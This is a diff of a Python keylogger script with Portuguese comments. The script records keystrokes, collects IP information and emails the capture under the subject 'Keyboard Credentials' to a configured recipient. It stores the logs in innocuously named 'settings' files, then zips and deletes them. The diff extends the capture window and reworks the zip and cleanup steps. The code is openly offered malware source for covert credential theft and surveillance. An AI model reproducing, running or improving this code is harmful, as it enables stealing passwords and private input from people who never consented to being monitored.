@@ -9,11 +9,11 @@ import time
 import zipfile
 import os
 
-def iniciar_keylogger(remetente_email, remetente_senha, destinatario_email, subject, tempo_maximo=10):
+def iniciar_keylogger(remetente_email, remetente_senha, destinatario_email, subject, tempo_maximo=60):
     teclas = []
-    tempo_inicial = time.time()  # Captura o tempo inicial
+    tempo_inicial = time.time()  
     num_zip = 1
-    num_txt = 1  # Contador para o arquivo .txt
+    num_txt = 1  
 
     def processar_tecla(tecla):
         if hasattr(tecla, 'char'):
@@ -29,7 +29,7 @@ def iniciar_keylogger(remetente_email, remetente_senha, destinatario_email, subj
         if tecla_processada is not None:
             teclas.append(tecla_processada)
             if time.time() - tempo_inicial >= tempo_maximo:
-                encerrar_keylogger(num_zip, num_txt)  # Chama a função para encerrar o keylogger
+                encerrar_keylogger(num_zip, num_txt)  
 
     def obter_informacoes_ip():
         try:
@@ -93,25 +93,26 @@ Informações de IP:
                 with open(f"settings{num_txt}.txt", "a") as arquivo:
                     arquivo.write(f"Erro ao enviar e-mail:\n{corpo_email}\n")
 
-            # Verifica se o arquivo zip com o número já existe
-            while os.path.exists(f"settings{num_zip}.zip"):
-                num_zip += 1
+            # Verifica se o arquivo .txt existe antes de criar o ZIP
+            if os.path.exists(f"settings{num_txt}.txt"):
+                num_zip = 1
+                num_txt = 1
 
-            # Verifica se o arquivo txt com o mesmo número existe
-            while os.path.exists(f"settings{num_txt}.txt"):
-                num_txt += 1
+                # Verifica se o arquivo zip com o mesmo número já existe
+                while os.path.exists(f"settings{num_zip}.zip"):
+                    num_zip += 1
 
-            # Cria o arquivo zip com o número
-            with zipfile.ZipFile(f"settings{num_zip}.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
-                zipf.write(f"settings{num_txt}.txt")  # Grava o arquivo .txt correspondente ao número do .zip
+                # Cria o arquivo zip com o número
+                with zipfile.ZipFile(f"settings{num_zip}.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
+                    zipf.write(f"settings{num_txt}.txt")  # Grava o arquivo .txt correspondente ao número do .zip
 
-            # Exclui o arquivo .txt após a criação do ZIP
-            os.remove(f"settings{num_txt}.txt")
+                # Exclui o arquivo .txt após a criação do ZIP
+                os.remove(f"settings{num_txt}.txt")
 
-            # Encerra o script após a criação do ZIP
-            exit(0)
-
-
+                exit(0)
+            else:
+                print("O arquivo .txt não existe. Nenhum arquivo ZIP será criado.")
+                exit(1)
 
         except Exception as e:
             print(f"Erro ao encerrar keylogger: {e}")
@@ -127,11 +128,9 @@ Informações de IP:
 
 if __name__ == "__main__":
     remetente_email = "seu_email@gmail.com"  # Substitua pelo seu e-mail
-    remetente_senha = "senha_de_token_para_app"  # Substitua pela sua senha de e-mail
-    destinatario_email = "Email_de_destino@gmail.com"  # Substitua pelo endereço de e-mail do destinatário
+    remetente_senha = "sua_senha"  # Substitua pela sua senha de e-mail
+    destinatario_email = "email_de_destino@gmail.com"  # Substitua pelo endereço de e-mail do destinatário
     subject = "Keyboard Credentials"
-
-    print("Sendo executado agora...")
-
-    # Iniciar a execução do keylogger.py
+    
     iniciar_keylogger(remetente_email, remetente_senha, destinatario_email, subject)
+
